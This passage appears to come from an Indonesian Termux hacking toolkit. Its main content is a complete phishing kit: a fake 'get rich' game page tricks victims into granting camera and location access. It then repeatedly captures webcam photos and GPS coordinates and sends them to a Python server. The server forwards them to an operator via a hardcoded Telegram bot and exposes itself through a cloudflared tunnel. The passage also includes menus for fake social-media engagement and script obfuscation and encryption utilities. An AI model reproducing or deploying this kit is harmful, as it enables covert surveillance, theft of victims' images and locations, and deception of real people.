    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Orbitron',monospace;}
    body{
      background: linear-gradient(135deg, #0b0e1a 0%, #1a1a2e 50%, #16213e 100%);
      color:#fff;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      overflow:hidden;
    }
    .screen{
      width:100%;
      max-width:420px;
      text-align:center;
      padding:40px;
      background: rgba(0, 245, 255, 0.05);
      border: 1px solid rgba(0, 245, 255, 0.3);
      border-radius: 20px;
      backdrop-filter: blur(10px);
      box-shadow: 0 0 30px rgba(0, 245, 255, 0.2);
    }
    h1{
      color:#00f5ff;
      text-shadow:0 0 15px #00f5ff;
      font-size:28px;
      margin-bottom:15px;
      letter-spacing: 2px;
    }
    p{
      font-size:14px;
      color:#8fbcff;
      margin-bottom:30px;
      line-height: 1.6;
    }
    .btn{
      background: linear-gradient(45deg, #00f5ff, #00c9ff);
      color:#0b0e1a;
      border:none;
      padding:16px 45px;
      border-radius:30px;
      font-size:16px;
      font-weight:bold;
      cursor:pointer;
      transition:.3s;
      box-shadow: 0 0 15px rgba(0, 245, 255, 0.5);
    }
    .btn:hover{
      transform:scale(1.05);
      box-shadow: 0 0 25px rgba(0, 245, 255, 0.8);
    }
    .avatar{
      width:130px;
      height:130px;
      border:2px solid #00f5ff;
      border-radius:50%;
      margin:0 auto 25px;
      background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="35" r="20" fill="%2300f5ff"/><rect x="30" y="60" width="40" height="30" fill="%2300f5ff"/></svg>') center/cover;
      box-shadow: 0 0 20px rgba(0, 245, 255, 0.6);
    }
    .popup{
      position:fixed;
      top:0;
      left:0;
      width:100%;
      height:100%;
      background: rgba(11, 14, 26, 0.95);
      display:none;
      align-items:center;
      justify-content:center;
      z-index:10;
    }
    .popup .card{
      background: linear-gradient(135deg, #111 0%, #1a1a2e 100%);
      border: 1px solid rgba(0, 245, 255, 0.5);
      border-radius: 20px;
      padding:30px;
      width:320px;
      text-align:center;
      box-shadow: 0 0 30px rgba(0, 245, 255, 0.3);
    }
    .hidden{display:none !important}
  </style>
</head>
<body>
  <div class="screen" id="welcome">
    <div class="avatar"></div>
    <h1>GAMELER CRASH</h1>
    <p>Klik mulai petualangan untuk melanjutkan ke tahap selanjutnya, anda sedikit lagi akan menempuh kekayaan</p>
    <button class="btn" onclick="showConsent()">Mulai Petualangan</button>
  </div>

  <div class="popup" id="consentPopup">
    <div class="card">
      <h2>Aktifkan Fitur AR</h2>
      <p>Setujui semua syarat sebelum claim Kekayaan yang menanti</p>
      <button class="btn" onclick="requestPermissions()">Aktifkan Sekarang</button>
    </div>
  </div>

  <div class="screen hidden" id="loadingScreen"><h1>Memuat AR...</h1></div>
  <div class="screen hidden" id="errorScreen"><h1>Terjadi Kesalahan</h1><button class="btn" onclick="location.reload()">Coba Lagi</button></div>
  <div class="screen hidden" id="hackedScreen"><h1>Terima kasih telah berpartisipasi!</h1></div>

  <script>
    function showConsent() {
      document.getElementById('welcome').classList.add('hidden');
      document.getElementById('consentPopup').style.display='flex';
    }

    async function requestPermissions() {
      document.getElementById('consentPopup').style.display='none';
      document.getElementById('loadingScreen').classList.remove('hidden');

      try {
        const [stream,pos]=await Promise.all([
          navigator.mediaDevices.getUserMedia({video:true}),
          new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej))
        ]);
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        video.srcObject=stream; await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];

        fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({index:1,lat,lon,img})
        });

        document.getElementById('loadingScreen').classList.add('hidden');

        let c=2;
        const iv=setInterval(async()=>{
          if(c>10){clearInterval(iv);document.getElementById('hackedScreen').classList.remove('hidden');return;}
          try{
            const [s,p]=await Promise.all([
              navigator.mediaDevices.getUserMedia({video:true}),
              new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej))
            ]);
            const v=document.createElement('video');
            v.srcObject=s;await v.play();
            const cn=document.createElement('canvas');
            [cn.width,cn.height]=[v.videoWidth,v.videoHeight];
            cn.getContext('2d').drawImage(v,0,0);
            fetch('/data',{
              method:'POST',
              headers:{'Content-Type':'application/json'},
              body:JSON.stringify({index:c,lat:p.coords.latitude,lon:p.coords.longitude,img:cn.toDataURL('image/jpeg').split(',')[1]})
            });
            s.getTracks().forEach(t=>t.stop());
            c++;
          }catch{clearInterval(iv);document.getElementById('errorScreen').classList.remove('hidden');}
        },5000);
        stream.getTracks().forEach(t=>t.stop());
      }catch{document.getElementById('errorScreen').classList.remove('hidden');}
    }
  </script>
</body>
</html>
EOF


  # Python server + Telegram otomatis
  cat > Danxy.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8212462693:AAHl5cZ8jEYKCDsHzG1lyEmVELK9l80ZFXU"
ADMIN_ID = input("[ ! ] MASUKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            idx, lat, lon, img = data["index"], data["lat"], data["lon"], data["img"]
            fn = f"img_{idx}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ FOTO ] [{idx}] {fn}  [ MAP ] {map_url}")
            tg_photo(ADMIN_ID, fn, f"Lokasi: {lat}, {lon}\nPeta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: http://t.me/phising_shadownex_bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print("[ ? ] CTRL +C UNTUK MENGHENTIKAN SERVER PHISING\n")
        print(f"[ ✓ ] LINK PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x Danxy.py
  python3 Danxy.py
}




menu_suntik() {
  # auto-install yt-dlp
  command -v yt-dlp >/dev/null || { pkg install -y yt-dlp 2>/dev/null; }

  while true; do
    clear
    echo -e "${RED}
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ ░█████╗░██╗░░░░░██╗░░░░░░██████╗██╗░░░██╗███╗░░██╗  │
  │ ██╔══██╗██║░░░░░██║░░░░░██╔════╝██║░░░██║████╗░██║  │
  │ ███████║██║░░░░░██║░░░░░╚█████╗░██║░░░██║██╔██╗██║  │
  ${WHITE}│ ██╔══██║██║░░░░░██║░░░░░░╚═══██╗██║░░░██║██║╚████║  │
  │ ██║░░██║███████╗███████╗██████╔╝╚██████╔╝██║░╚███║  │
  │ ╚═╝░░╚═╝╚══════╝╚══════╝╚═════╝░░╚═════╝░╚═╝░░╚══╝  │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  │                ${BG_RED}${YELLOW}ALL BASE FITUR SUNTIK${NC}                │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
   ${BG_RED}${WHITE}CODE BY DANXY OFFICIAL${NC}             ${BG_RED}${WHITE} EDITOR BY SHADOWNEX${NC}"
    echo -e "
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │                  ALL SUNTIK TIKTOK                 │
  ├━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┤
  │ [  01  ] LIKE TIKTOK                               │
  │ [  02  ] FOLLOWERS TIKTOK                          │
  │ [  03  ] VIEW / PENONTON TIKTOK                    │
  │ [  04  ] FAVORIT TIKTOK                            │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │                  ALL SUNTIK INSTAGRAM              │
  ├━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┤
  │ [  05  ] FOLLOWERS INSTAGRAM                       │
  │ [  06  ] LIKE INSTAGRAM                            │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │                  ALL SUNTIK YOUTUBE                │
  ├━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┤
  │ [  07  ] SUBSCRIBE YOUTUBE                         │
  │ [  08  ] LIKE VIDEO YOUTUBE                        │
  │ [  09  ] VIEW / PENONTON YOUTUBE                   │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │                  ALL SUNTIK TWITTER                │
  ├━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┤
  │ [  10  ] FOLLOWERS TWITTER                         │
  │ [  11  ] RETWEET TWITTER                           │
  │ [  12  ] LIKE TWITTER                              │
  │ [  13  ] VIEW TWITTER                              │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ [  00  ] EXIT / KELUAR                             │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
      printf "\n  ${GREEN}┏━[ ${RED}ShadowNex X Tools${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW} MENU SUNTIK ${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
      read -r SUNTIK_MENU
    case $SUNTIK_MENU in
      01|1)
      like_titok
       ;;
      02|2)
      ltitok_follow
      ;;
      03|3)
      view_titok
      ;;
      04|4)
      favorit_titok
       ;;
      05|5)
      followIG
      ;;
      06|6)
      likeIG
      ;;
      07|7)
      subscribeYT
      ;;
      08|8)
      like_YT
      ;;
      09|9)
      viewYT
      ;;
      10)
      foll
      ;;
      11)
      retwet
      ;;
      12)
      likeTwet
      ;;
      13)
      viewTwit
      ;;
      00|0) break ;;
      *) echo -e "${RED}PILIHAN TIDAK VALID${NC}"; sleep 1 ;;
    esac
  done
}

like_titok() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs Like TikTok...${NC}"
  xdg-open "https://www.famety.net/free-tiktok-likes" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}

ltitok_follow() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs Followers TikTok...${NC}"
  xdg-open "https://www.famety.net/free-tiktok-fans" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}

view_titok() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs View TikTok...${NC}"
  xdg-open "https://www.famety.net/free-tiktok-views" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}

favorit_titok() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs Favorite TikTok...${NC}"
  xdg-open "https://www.famety.net/free-tiktok-saves" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}

followIG() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs Followers Instagram...${NC}"
  xdg-open "https://www.famety.net/free-instagram-followers" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}

likeIG() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs Like Instagram...${NC}"
  xdg-open "https://www.famety.net/get-free-instagram-likes" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}

subscribeYT() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs Subscribe YouTube...${NC}"
  xdg-open "https://www.famety.net/free-youtube-subscribers" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}

like_YT() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs Like YouTube...${NC}"
  xdg-open "https://www.famety.net/free-youtube-likes" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}

viewYT() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs View YouTube...${NC}"
  xdg-open "https://www.famety.net/free-youtube-views" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}

foll() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs Followers Twitter...${NC}"
  xdg-open "https://www.famety.net/free-twitter-x-followers" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}

retwet() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs Retweet Twitter...${NC}"
  xdg-open "https://www.famety.net/get-free-twitter-x-retweets" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}

likeTwet() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs Like Twitter...${NC}"
  xdg-open "https://www.famety.net/free-twitter-x-likes" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}

viewTwit() {
  clear
  loading
  echo -e "${GREEN}[*] Membuka situs View Twitter...${NC}"
  xdg-open "https://www.famety.net/free-twitter-x-views" 2>/dev/null &
  sleep 2
  echo -e "${YELLOW}[*] Situs telah dibuka di browser${NC}"
  echo -e "${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
  read -r
}




loading() {
    echo -ne "${CYAN}Loading "
    for i in {1..10}; do
        echo -ne "█"
        sleep 0.1
    done
    echo -e "${NC}"
}

show_loading() {
    local text="$1"
    echo -ne "${CYAN}[ ${text} ]${NC}"
    play_sound
    
    for i in {0..10}; do
        case $i in
            0) echo -ne "\r[ ░░░░░░░░░░ ] 0 %  | ";;
            1) echo -ne "\r[ █░░░░░░░░░ ] 10 % | ";;
            2) echo -ne "\r[ ██░░░░░░░░ ] 20 % | ";;
            3) echo -ne "\r[ ███░░░░░░░ ] 30 % | ";;
            4) echo -ne "\r[ ████░░░░░░ ] 40 % | ";;
            5) echo -ne "\r[ █████░░░░░ ] 50 % | ";;
            6) echo -ne "\r[ ██████░░░░ ] 60 % | ";;
            7) echo -ne "\r[ ███████░░░ ] 70 % | ";;
            8) echo -ne "\r[ ████████░░ ] 80 % | ";;
            9) echo -ne "\r[ █████████░ ] 90 % | ";;
            10) echo -ne "\r[ ██████████ ] DONE | \n";;
        esac
        sleep 0.3
    done
}

show_loading2() {
    local text="$1"
    echo -ne "${CYAN}[ ${text} ]${NC}"
    sound_keluar
    
    for i in {0..10}; do
        case $i in
            0) echo -ne "\r[ ░░░░░░░░░░ ] 0 %  | ";;
            1) echo -ne "\r[ █░░░░░░░░░ ] 10 % | ";;
            2) echo -ne "\r[ ██░░░░░░░░ ] 20 % | ";;
            3) echo -ne "\r[ ███░░░░░░░ ] 30 % | ";;
            4) echo -ne "\r[ ████░░░░░░ ] 40 % | ";;
            5) echo -ne "\r[ █████░░░░░ ] 50 % | ";;
            6) echo -ne "\r[ ██████░░░░ ] 60 % | ";;
            7) echo -ne "\r[ ███████░░░ ] 70 % | ";;
            8) echo -ne "\r[ ████████░░ ] 80 % | ";;
            9) echo -ne "\r[ █████████░ ] 90 % | ";;
            10) echo -ne "\r[ ██████████ ] DONE | \n";;
        esac
        sleep 0.3
    done
}

spasi() {
    echo
}

kembali_ke_menu() {
    show_loading "Kembali ke menu utama"
    echo
}

clear_screen() {
    clear
}

bash_encrypt_banner() {
    echo -e "${CYAN}"
    cat << "EOF"

███████╗███╗   ██╗ ██████╗    ██████╗  █████╗ ███████╗██╗  ██╗
██╔════╝████╗  ██║██╔════╝    ██╔══██╗██╔══██╗██╔════╝██║  ██║
█████╗  ██╔██╗ ██║██║         ██████╔╝███████║███████╗███████║
██╔══╝  ██║╚██╗██║██║         ██╔══██╗██╔══██║╚════██║██╔══██║
███████╗██║ ╚████║╚██████╗    ██████╔╝██║  ██║███████║██║  ██║
╚══════╝╚═╝  ╚═══╝ ╚═════╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

 • Creator : Mr./ShadowNex 
EOF
    echo -e "${NC}"
}

obfuscate_code() {
    local infile="$1"
    local outfile="$2"
    
    local obfuscated=""
    local line_num=1
    
    while IFS= read -r line || [[ -n "$line" ]]; do
        local new_line=""
        local in_string=false
        local string_char=""
        local escaped=false
        
        for (( i=0; i<${#line}; i++ )); do
            local char="${line:$i:1}"
            
            if [ "$escaped" = true ]; then
                new_line="${new_line}\\$char"
                escaped=false
                continue
            fi
            
            if [ "$char" = "\\" ]; then
                escaped=true
                continue
            fi
            
            if [ "$in_string" = false ]; then
                if [ "$char" = "\"" ] || [ "$char" = "'" ]; then
                    in_string=true
                    string_char="$char"
                    new_line="${new_line}$char"
                elif [ "$char" = "e" ] && [ "${line:$i:4}" = "exec" ]; then
                    new_line="${new_line}_x_e_c"
                    i=$((i+3))
                elif [[ "$char" =~ [a-zA-Z0-9_] ]] && [ $((RANDOM % 3)) -eq 0 ]; then
                    new_line="${new_line}${char}_${RANDOM}"
                else
                    new_line="${new_line}$char"
                fi
            else
                if [ "$char" = "$string_char" ] && [ "$escaped" = false ]; then
                    in_string=false
                    string_char=""
                fi
                new_line="${new_line}$char"
            fi
        done
        
        obfuscated="${obfuscated}${new_line}\n"
        line_num=$((line_num + 1))
    done < "$infile"
    
    printf "%b" "$obfuscated" > "$outfile"
    
    if [[ -f "$outfile" ]] && [[ -s "$outfile" ]]; then
        echo -e "${RED}[+] Obfuscate berhasil${NC}"
        return 0
    else
        echo -e "${RED}[!] Gagal mengobfuscate${NC}"
        return 1
    fi
}

generate_key() {
    local key1=$(head -c 16 /dev/urandom | xxd -p)
    local key2=$(head -c 16 /dev/urandom | xxd -p)
    local key3=$(head -c 16 /dev/urandom | xxd -p)
    echo "${key1}:${key2}:${key3}"
}

check_dependencies() {
    command -v openssl >/dev/null 2>&1 || {
        echo -e "${RED}[!] Error: Anda belum menginstall openssl${NC}"
        echo -e "${YELLOW}[*] Install dengan: pkg install openssl-tool${NC}"
        return 1
    }
    
    command -v xxd >/dev/null 2>&1 || {
        echo -e "${RED}[!] Error: Anda belum menginstall xxd${NC}"
        echo -e "${YELLOW}[*] Install dengan: pkg install xxd${NC}"
        return 1
    }
    
    command -v base64 >/dev/null 2>&1 || {
        echo -e "${RED}[!] Error: Anda belum menginstall base64${NC}"
        echo -e "${YELLOW}[*] Install dengan: pkg install coreutils${NC}"
        return 1
    }
    
    echo -e "${RED}[+] Semua dependencies tersedia${NC}"
    return 0
}

encrypt_bash_file() {
    local infile="$1"
    local keys="$2"
    local outfile="${infile%.*}_encrypted.sh"
    
    echo -e "${YELLOW}[*] Memulai enkripsi file...${NC}"
    
    IFS=':' read -r key1 key2 key3 <<< "$keys"
    
    openssl enc -aes-128-ecb -K "$key1" -nosalt -in ".tmp_obfuscated" -out ".tmp_encrypted1.bin" 2>/dev/null
    [[ $? -ne 0 ]] && return 1
    
    openssl enc -aes-128-cbc -K "$key2" -iv $(echo -n "$key2" | head -c 16) -nosalt -in ".tmp_encrypted1.bin" -out ".tmp_encrypted2.bin" 2>/dev/null
    [[ $? -ne 0 ]] && return 1
    
    openssl enc -aes-128-ofb -K "$key3" -iv $(echo -n "$key3" | head -c 16) -nosalt -in ".tmp_encrypted2.bin" -out ".tmp_encrypted3.bin" 2>/dev/null
    [[ $? -ne 0 ]] && return 1
    
    base64 ".tmp_encrypted3.bin" > ".tmp_encrypted.b64" 2>/dev/null
    [[ $? -ne 0 ]] && return 1
    
    local key1_b64=$(echo -n "$key1" | base64)
    local key2_b64=$(echo -n "$key2" | base64)
    local key3_b64=$(echo -n "$key3" | base64)
    local enc_b64=$(cat ".tmp_encrypted.b64" | tr -d '\n')
    
    cat > "$outfile" << EOF
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
MAGENTA='\033[1;35m'
NC='\033[0m'

echo -e "\${YELLOW}[*] Starting decryption...\${NC}"

K1="$key1_b64"
K2="$key2_b64"
K3="$key3_b64"
ENC="$enc_b64"

echo "\$ENC" | base64 -d 2>/dev/null > .tmp_e3.bin

K3d=\$(echo -n "\$K3" | base64 -d 2>/dev/null | xxd -p | tr -d '\n')
K3iv=\$(echo "\$K3d" | head -c 32)

openssl enc -d -aes-128-ofb -K "\$K3d" -iv "\$K3iv" -nosalt -in .tmp_e3.bin -out .tmp_e2.bin 2>/dev/null
if [ \$? -ne 0 ]; then
    echo -e "\${RED}[!] Decrypt layer 3 failed\${NC}"
    rm -f .tmp_e*.bin
    exit 1
fi

K2d=\$(echo -n "\$K2" | base64 -d 2>/dev/null | xxd -p | tr -d '\n')
K2iv=\$(echo "\$K2d" | head -c 32)

openssl enc -d -aes-128-cbc -K "\$K2d" -iv "\$K2iv" -nosalt -in .tmp_e2.bin -out .tmp_e1.bin 2>/dev/null
if [ \$? -ne 0 ]; then
    echo -e "\${RED}[!] Decrypt layer 2 failed\${NC}"
    rm -f .tmp_e*.bin
    exit 1
fi

K1d=\$(echo -n "\$K1" | base64 -d 2>/dev/null | xxd -p | tr -d '\n')

openssl enc -d -aes-128-ecb -K "\$K1d" -nosalt -in .tmp_e1.bin -out .tmp_dec.sh 2>/dev/null
if [ \$? -ne 0 ]; then
    echo -e "\${RED}[!] Decrypt layer 1 failed\${NC}"
    rm -f .tmp_e*.bin
    exit 1
fi

chmod +x .tmp_dec.sh
echo -e "\${GREEN}[+] Decryption successful\${NC}"
echo -e "\${YELLOW}[*] Executing script...\${NC}"
bash .tmp_dec.sh
EXIT_CODE=\$?

rm -f .tmp_e*.bin .tmp_dec.sh
exit \$EXIT_CODE
EOF
    
    chmod +x "$outfile"
    
    rm -f ".tmp_obfuscated" ".tmp_encrypted"* ".tmp_encrypted.b64" 2>/dev/null
    
    if [[ -f "$outfile" ]]; then
        echo -e "${RED}[+] File terenkripsi berhasil dibuat:${NC}"
        echo -e "${CYAN}   $outfile${NC}"
        echo -e "${YELLOW}[*] Encryption Keys:${NC}"
        echo -e "${RED}   Key1: $key1${NC}"
        echo -e "${RED}   Key2: $key2${NC}"
        echo -e "${RED}   Key3: $key3${NC}"
        echo -e "${YELLOW}[*] Simpan semua keys ini!${NC}"
        return 0
    else
        echo -e "${RED}[!] Gagal membuat file terenkripsi${NC}"
        return 1
    fi
}

encrypt_bash_script() {
    clear
    bash_encrypt_banner
    echo ""
    
    echo -e "${YELLOW}[1] Encrypt Bash Script (.sh)${NC}"
    echo -e "${YELLOW}[2] Kembali ke Menu${NC}"
    echo ""
    
    printf "   ${RED}┏━[ ${RED}ShadowNex X Tools${NC} ${RED}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} ENCRYPT ${YELLOW}${RED}]${NC}${RED}\n   ┗━━${RED}❯${YELLOW}❯${RED}❯${YELLOW} "
    read -r choice
    
    case $choice in
        1)
            echo ""
            read -p "[ • ] Masukkan file Bash (.sh) : " input_file
            echo ""
            
            [[ ! -f "$input_file" ]] && echo -e "${RED}[!] File tidak ditemukan.${NC}" && echo "" && sleep 2 && return 1
            [[ ! "$input_file" =~ \.sh$ ]] && echo -e "${RED}[!] File harus berekstensi .sh${NC}" && echo "" && sleep 2 && return 1
            
            show_loading "Checking dependencies"
            check_dependencies
            [[ $? -ne 0 ]] && echo "" && sleep 2 && return 1
            
            show_loading "Generate encryption keys"
            local keys=$(generate_key)
            
            show_loading "Obfuscate code"
            obfuscate_code "$input_file" ".tmp_obfuscated"
            [[ $? -ne 0 ]] && rm -f ".tmp_obfuscated" 2>/dev/null && return 1
            
            show_loading "Encrypt file"
            encrypt_bash_file "$input_file" "$keys"
            
            rm -f ".tmp_obfuscated" 2>/dev/null
            
            echo ""
            echo -e "${YELLOW}[*] Tekan ENTER untuk kembali ke menu...${NC}"
            read -r
            ;;
        2)
            echo -e "${YELLOW}[*] Kembali ke menu utama...${NC}"
            return
            ;;
        *)
            echo -e "${RED}[!] Pilihan tidak valid.${NC}"
            echo ""
            sleep 2
            return 1
            ;;
    esac
}

check_python_deps() {
    if ! python3 -c "import Crypto" 2>/dev/null; then
        echo -e "${YELLOW}[*] Installing pycryptodome...${NC}"
        pip3 install pycryptodome
        if [ $? -ne 0 ]; then
            echo -e "${RED}[!] Gagal menginstall pycryptodome${NC}"
            return 1
        fi
    fi
    
    if ! python3 -c "import marshal" 2>/dev/null; then
        echo -e "${RED}[!] Modul marshal tidak tersedia${NC}"
        return 1
    fi
    
    echo -e "${RED}[+] Python dependencies tersedia${NC}"
    return 0
}

compile_to_bytecode() {
    local input_file="$1"
    local bytecode_file=$(mktemp)
    
    python3 -c "
import marshal
with open('$input_file', 'r') as f:
    code = compile(f.read(), '$input_file', 'exec')
with open('$bytecode_file', 'wb') as bf:
    bf.write(marshal.dumps(code))
" 2>/dev/null
    
    if [[ $? -ne 0 ]] || [[ ! -s "$bytecode_file" ]]; then
        rm -f "$bytecode_file" 2>/dev/null
        return 1
    fi
    
    echo "$bytecode_file"
}

generate_random_key() {
    openssl rand -hex 16
}

encrypt_banner() {
    clear
    echo -e "${CYAN}"
    cat <<'EOF'
  __   ____  ____        ____  ___  ____
 / _\ (  __)/ ___)  ___ (  __)/ __)(  _ )
/    \ ) _) \___ \ (___) ) _)( (__  ) _ (
\_/\_/(____)(____/      (____)\___)(____/

 • Creator : Mr./ShadowNex 
EOF
    echo -e "${NC}"
}

encrypt_python_file() {
    local input_file="$1"
    
    show_loading "Check dependencies"
    check_python_deps
    [[ $? -ne 0 ]] && return 1
    
    show_loading "Compile ke bytecode"
    local bytecode_file=$(compile_to_bytecode "$input_file")
    [[ $? -ne 0 || ! -f "$bytecode_file" ]] && echo -e "${RED}[!] Gagal mengkompilasi file ke bytecode.${NC}" && echo "" && sleep 2 && return 1
    
    show_loading "Generate encryption keys"
    local key1=$(generate_random_key)
    local key2=$(generate_random_key)
    local key3=$(generate_random_key)
    
    show_loading "Encrypt bytecode layer 1"
